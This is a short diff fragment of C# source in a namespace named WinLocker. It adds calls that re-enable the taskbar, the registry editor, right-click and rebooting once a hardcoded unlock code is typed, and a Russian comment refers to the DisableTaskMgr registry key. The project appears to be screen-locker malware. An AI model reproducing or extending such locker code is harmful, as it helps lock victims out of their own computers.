@@ -274,6 +274,10 @@ namespace WinLocker
         {
             if (textBox1.Text == "label")
             {
+                TaskBar.Unlock();
+                Registry_editor.Unlock();
+                Right_click.Unlock();
+                Rebooting.Unlock();
                 try
                 {
                     // Путь до ключа реестра для DisableTaskMgr
